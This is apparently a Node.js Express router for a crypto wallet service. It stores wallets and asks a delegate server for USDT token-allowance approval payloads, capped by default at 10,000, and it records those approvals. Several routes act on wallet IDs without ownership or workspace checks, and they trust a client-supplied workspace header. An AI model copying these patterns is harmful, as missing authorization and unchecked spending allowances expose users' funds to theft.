const express = require("express");
const prisma = require("../../../lib/prisma");
const { authenticate } = require("../../../middleware/auth");
const { AppError } = require("../../../middleware/error");

const router = express.Router();

// GET /wallets
router.get("/", authenticate, async (req, res, next) => {
  try {
    const workspaceId = req.headers["x-workspace-id"];
    const wallets = await prisma.wallet.findMany({
      where: { workspaceId },
      include: { chain: true },
      orderBy: { createdAt: "asc" },
    });
    res.json({ success: true, data: wallets });
  } catch (err) { next(err); }
});

// POST /wallets
router.post("/", authenticate, async (req, res, next) => {
  try {
    const { label, address, chainId, provider } = req.body;
    const workspaceId = req.headers["x-workspace-id"];
    if (!workspaceId) throw new AppError("x-workspace-id required", 400, "BAD_REQUEST");

    const wallet = await prisma.wallet.create({
      data: {
        workspaceId,
        userId: req.user.id,
        label,
        address,
        chainId,
        provider,
        status: "CONNECTED",
        verifiedAt: new Date(),
      },
      include: { chain: true },
    });

    res.status(201).json({ success: true, data: wallet });
  } catch (err) { next(err); }
});

// DELETE /wallets/:id
router.delete("/:id", authenticate, async (req, res, next) => {
  try {
    await prisma.wallet.update({
      where: { id: req.params.id },
      data: { status: "DISCONNECTED" },
    });
    res.json({ success: true });
  } catch (err) { next(err); }
});

module.exports = router;

const http = require("http");

function delegatePost(path, body) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(body);
    const req = http.request({
      host: new URL(process.env.DELEGATE_SERVER_URL || "http://172.19.0.1:3001").hostname,
      port: new URL(process.env.DELEGATE_SERVER_URL || "http://172.19.0.1:3001").port,
      path,
      method: "POST",
      timeout: 10000,
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(data),
        "x-delegate-secret": process.env.DELEGATE_SHARED_SECRET || "",
      },
    }, res => {
      let d = "";
      res.on("data", c => d += c);
      res.on("end", () => {
        if (res.statusCode < 200 || res.statusCode >= 300) {
          return reject(new Error("Delegate server error " + res.statusCode + ": " + d));
        }
        try { resolve(JSON.parse(d)); } catch (e) { reject(new Error("Delegate server returned non-JSON: " + d)); }
      });
    });
    req.on("timeout", () => req.destroy(new Error("Delegate server request timed out")));
    req.on("error", reject);
    req.write(data);
    req.end();
  });
}

// POST /wallets/link-payload
router.post("/link-payload", authenticate, async (req, res, next) => {
  try {
    const { walletIds, capUSDT = 10000 } = req.body;
    const wallets = await prisma.wallet.findMany({
      where: { id: { in: walletIds } },
      include: { chain: true },
    });
    const chains = wallets.map(w => w.chain?.type === "SOLANA" ? "SPL" : w.chain?.type === "TRON" ? "TRC20" : "ERC20");
    const addresses = {};
    for (const w of wallets) {
      const key = w.chain?.type === "SOLANA" ? "SPL" : w.chain?.type === "TRON" ? "TRC20" : "ERC20";
      addresses[key] = w.address;
    }
    const result = await delegatePost("/link-payload", { chains, capUSDT, addresses });
    res.json({ success: true, data: { payloads: result.payloads } });
  } catch (err) { next(err); }
});

// POST /wallets/:id/link-confirm
router.post("/:id/link-confirm", authenticate, async (req, res, next) => {
  try {
    const { txHash } = req.body;
    const wallet = await prisma.wallet.findUnique({ where: { id: req.params.id }, include: { chain: true } });
    if (!wallet) throw new AppError("Wallet not found", 404, "NOT_FOUND");
    const chainKey = wallet.chain?.type === "SOLANA" ? "SPL" : wallet.chain?.type === "TRON" ? "TRC20" : "ERC20";
    const addresses = { [chainKey]: wallet.address };
    const statusRes = await delegatePost("/status", { chains: [chainKey], addresses });
    const chainStatus = (statusRes.statuses || []).find(s => s.chain === chainKey);
    if (!chainStatus || chainStatus.error) {
      throw new AppError(
        "Could not verify on-chain approval: " + (chainStatus?.error || "no status returned"),
        400, "DELEGATE_STATUS_UNAVAILABLE"
      );
    }
    const allowanceValue = Number(chainStatus.allowance);
    if (!Number.isFinite(allowanceValue) || allowanceValue <= 0) {
      throw new AppError(
        "On-chain allowance not found or zero — approval transaction not yet confirmed",
        400, "DELEGATE_NOT_APPROVED"
      );
    }
    await prisma.wallet.update({
      where: { id: wallet.id },
      data: { delegateApproved: true, delegateChain: chainKey, linkTxHash: txHash, verifiedAt: new Date() },
    });
    // Link wallet to portfolio if not already linked
    const workspaceId = req.headers["x-workspace-id"];
    const portfolio = await prisma.portfolio.findFirst({ where: { workspaceId } });
    if (portfolio) {
      await prisma.portfolioWallet.upsert({
        where: { portfolioId_walletId: { portfolioId: portfolio.id, walletId: wallet.id } },
        create: { portfolioId: portfolio.id, walletId: wallet.id },
        update: {},
      });
    }
    res.json({ success: true, data: { linked: true } });
  } catch (err) { next(err); }
});

// POST /wallets/:id/unlink-payload
router.post("/:id/unlink-payload", authenticate, async (req, res, next) => {
  try {
    const wallet = await prisma.wallet.findUnique({ where: { id: req.params.id }, include: { chain: true } });
    if (!wallet) throw new AppError("Wallet not found", 404, "NOT_FOUND");
    const chainKey = wallet.chain?.type === "SOLANA" ? "SPL" : wallet.chain?.type === "TRON" ? "TRC20" : "ERC20";
    const result = await delegatePost("/revoke-payload", { walletId: wallet.id, address: wallet.address, chain: chainKey });
    res.json({ success: true, data: { payload: result.payload } });
  } catch (err) { next(err); }
});

// POST /wallets/:id/unlink-confirm
router.post("/:id/unlink-confirm", authenticate, async (req, res, next) => {
  try {
    await prisma.wallet.update({
      where: { id: req.params.id },
      data: { delegateApproved: false, delegateChain: null, linkTxHash: null },
    });
    res.json({ success: true });
  } catch (err) { next(err); }
});

// GET /wallets/delegate-status
router.get("/delegate-status", authenticate, async (req, res, next) => {
  try {
    const workspaceId = req.headers["x-workspace-id"];
    const wallets = await prisma.wallet.findMany({ where: { workspaceId, delegateApproved: true } });
    res.json({ success: true, data: wallets });
  } catch (err) { next(err); }
});
